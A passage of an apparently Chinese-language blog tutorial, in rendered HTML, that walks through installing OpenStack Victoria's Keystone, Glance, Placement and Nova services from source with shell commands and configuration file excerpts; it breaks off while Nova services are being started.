class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git -b stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">pip install bindep</span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment">#pip install -e .</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置文件</span></span><br><span class="line">git init</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库，密码设置为 mysql_db</span></span><br><span class="line">sudo mysql_secure_installation</span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE keystone;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">sudo mkdir /etc/keystone</span><br><span class="line">sudo cp etc/keystone.conf.sample /etc/keystone/keystone.conf</span><br><span class="line">sudo vim /etc/keystone/keystone.conf</span><br><span class="line"><span class="comment">#[database]</span></span><br><span class="line"><span class="comment">#connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo python setup.py install</span><br><span class="line">keystone-manage db_sync</span><br><span class="line"><span class="comment">#.tox/genconfig/bin/pip3 install opentracing</span></span><br><span class="line"><span class="comment">#.tox/genconfig/bin/keystone-manage db_sync</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 令牌</span></span><br><span class="line">sudo mkdir -p /etc/keystone/fernet-keys</span><br><span class="line"><span class="comment"># sudo rm -rf /etc/keystone/fernet-keys/</span></span><br><span class="line">sudo keystone-manage fernet_setup --keystone-user jck --keystone-group jck</span><br><span class="line">sudo keystone-manage credential_setup --keystone-user jck --keystone-group jck</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">keystone-manage bootstrap --bootstrap-password ADMIN_PASS \</span><br><span class="line">  --bootstrap-admin-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-internal-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-public-url http://controller:5000/v3/ \</span><br><span class="line">  --bootstrap-region-id RegionOne</span><br><span class="line">  </span><br><span class="line"><span class="comment"># apache</span></span><br><span class="line">sudo apt install apache2 libapache2-mod-wsgi-py3 -y</span><br><span class="line">sudo cp httpd/wsgi-keystone.conf /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line">sudo vim /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line"><span class="comment"># 修改 user 和 group 为 jck</span></span><br><span class="line">sudo ln -s /etc/apache2/conf-available/wsgi-keystone.conf /etc/apache2/conf-enabled/wsgi-keystone.conf</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装客户端</span></span><br><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建脚本</span></span><br><span class="line">cat &lt;&lt;<span class="string">EOF&gt;&gt; admin-openrc</span></span><br><span class="line"><span class="string">export OS_USERNAME=admin</span></span><br><span class="line"><span class="string">export OS_PASSWORD=ADMIN_PASS</span></span><br><span class="line"><span class="string">export OS_PROJECT_NAME=admin</span></span><br><span class="line"><span class="string">export OS_USER_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_PROJECT_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_AUTH_URL=http://controller:5000/v3</span></span><br><span class="line"><span class="string">export OS_IDENTITY_API_VERSION=3</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载环境变量</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">openstack user list</span><br></pre></td></tr></table></figure><h2 id="Glance"><a href="#Glance" class="headerlink" title="Glance"></a>Glance</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码 mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE glance;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON glance.* TO &#x27;glance&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;GLANCE_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载环境变量</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建项目</span></span><br><span class="line">openstack project create --domain default --description <span class="string">&quot;Service Project&quot;</span> service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用户，设置密码为 glance</span></span><br><span class="line">openstack user create --domain default --password-prompt glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到 admin 角色</span></span><br><span class="line">openstack role add --project service --user glance admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务实体</span></span><br><span class="line">openstack service create --name glance --description <span class="string">&quot;OpenStack Image&quot;</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务 API 端点（endpoint）</span></span><br><span class="line">openstack endpoint create --region RegionOne image public http://controller:9292</span><br><span class="line">openstack endpoint create --region RegionOne image internal http://controller:9292</span><br><span class="line">openstack endpoint create --region RegionOne image admin http://controller:9292</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">.tox/genconfig/bin/pip3 install opentracing</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">sudo mkdir /etc/glance</span><br><span class="line">sudo cp etc/glance-api.conf /etc/glance/glance-api.conf</span><br><span class="line">sudo cp etc/glance-api-paste.ini /etc/glance/glance-api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑配置文件</span></span><br><span class="line">sudo vim /etc/glance/glance-api.conf</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span>  = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = glance</span><br><span class="line"><span class="attr">password</span> = glance</span><br><span class="line"><span class="comment">#memcached_servers = controller:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[paste_deploy]</span></span><br><span class="line"><span class="attr">flavor</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance_store]</span></span><br><span class="line"><span class="attr">stores</span> = file,http</span><br><span class="line"><span class="attr">default_store</span> = file</span><br><span class="line"><span class="attr">filesystem_store_datadir</span> = /var/lib/glance/images/</span><br></pre></td></tr></table></figure><p>启用服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填充数据库</span></span><br><span class="line">.tox/genconfig/bin/glance-manage db_sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用服务（后台）</span></span><br><span class="line">sudo glance-api --config-file=/etc/glance/glance-api.conf --config-file=/etc/glance/glance-api-paste.ini --debug</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源镜像</span></span><br><span class="line">wget http://download.cirros-cloud.net/0.4.0/cirros-0.4.0-x86_64-disk.img</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传镜像到镜像服务，公开可见（所有项目都可以访问）</span></span><br><span class="line">openstack image create <span class="string">&quot;cirros&quot;</span> \</span><br><span class="line">  --file cirros-0.4.0-x86_64-disk.img \</span><br><span class="line">  --disk-format qcow2 --container-format bare \</span><br><span class="line">  --public</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 列出镜像</span></span><br><span class="line">openstack image list</span><br></pre></td></tr></table></figure><h2 id="Placement"><a href="#Placement" class="headerlink" title="Placement"></a>Placement</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码 mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE placement;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON placement.* TO &#x27;placement&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;PLACEMENT_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载环境变量</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用户，设置密码为 placement</span></span><br><span class="line">openstack user create --domain default --password-prompt placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到 admin 角色</span></span><br><span class="line">openstack role add --project service --user placement admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务实体</span></span><br><span class="line">openstack service create --name placement --description <span class="string">&quot;Placement API&quot;</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务 API 端点（endpoint）</span></span><br><span class="line">openstack endpoint create --region RegionOne placement public http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement internal http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement admin http://controller:8778</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/placement.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line"><span class="comment"># .tox/shared/bin/pip3 install -r requirements.txt</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>配置文件 /etc/placement/placement.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">sudo mkdir /etc/placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line">sudo cp etc/placement/placement.conf.sample /etc/placement/placement.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">sudo vim /etc/placement/placement.conf</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[placement_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement</span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br></pre></td></tr></table></figure><p>启用服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填充数据库</span></span><br><span class="line">.tox/shared/bin/placement-manage db sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用服务</span></span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo placement-api --port 8778</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. admin-openrc</span><br><span class="line">placement-status upgrade check</span><br></pre></td></tr></table></figure><h2 id="Nova"><a href="#Nova" class="headerlink" title="Nova"></a>Nova</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 RabbitMQ</span></span><br><span class="line">sudo apt install rabbitmq-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 openstack 用户</span></span><br><span class="line">sudo rabbitmqctl add_user openstack RABBIT_PASS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限设置</span></span><br><span class="line">sudo rabbitmqctl set_permissions openstack <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库配置，密码 mysql_db</span></span><br><span class="line">sudo mysql -u root -p</span><br><span class="line"><span class="comment">#CREATE DATABASE nova_api;</span></span><br><span class="line"><span class="comment">#CREATE DATABASE nova;</span></span><br><span class="line"><span class="comment">#CREATE DATABASE nova_cell0;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_api.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"><span class="comment">#GRANT ALL PRIVILEGES ON nova_cell0.* TO &#x27;nova&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;NOVA_DBPASS&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载环境变量</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用户，设置密码为 nova</span></span><br><span class="line">openstack user create --domain default --password-prompt nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到 admin 角色</span></span><br><span class="line">openstack role add --project service --user nova admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务实体</span></span><br><span class="line">openstack service create --name nova --description <span class="string">&quot;OpenStack Compute&quot;</span> compute</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务 API 端点（endpoint）</span></span><br><span class="line">openstack endpoint create --region RegionOne compute public http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">sudo mkdir /etc/nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line">sudo cp etc/nova/nova.conf.sample /etc/nova/nova.conf</span><br><span class="line">sudo cp etc/nova/api-paste.ini /etc/nova/api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">sudo vim /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[api_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@controller/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:RABBIT_PASS@controller:<span class="number">5672</span>/</span><br><span class="line"><span class="attr">my_ip</span> = <span class="number">10.0</span>.<span class="number">2.28</span></span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = nova</span><br><span class="line"><span class="attr">password</span> = nova</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server_listen</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">server_proxyclient_address</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">novncproxy_base_url</span> = http://controller:<span class="number">6080</span>/vnc_auto.html</span><br><span class="line"></span><br><span class="line"><span class="section">[glance]</span></span><br><span class="line"><span class="attr">api_servers</span> = http://controller:<span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_concurrency]</span></span><br><span class="line"><span class="attr">lock_path</span> = /var/lib/nova/tmp</span><br><span class="line"></span><br><span class="line"><span class="section">[placement]</span></span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br></pre></td></tr></table></figure><p>启用服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># novnc</span></span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/novnc/noVNC.git /usr/share/novnc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充数据库</span></span><br><span class="line"><span class="comment">#.tox/shared/bin/pip3 install opentracing</span></span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf api_db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 map_cell0</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 create_cell --name=cell1 --verbose</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 list_cells</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动服务 nova-api、nova-scheduler、nova-conductor</span></span><br><span class="line">sudo nova-api --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br><span class="line">sudo nova-scheduler --config-file=/etc/nova/nova.conf 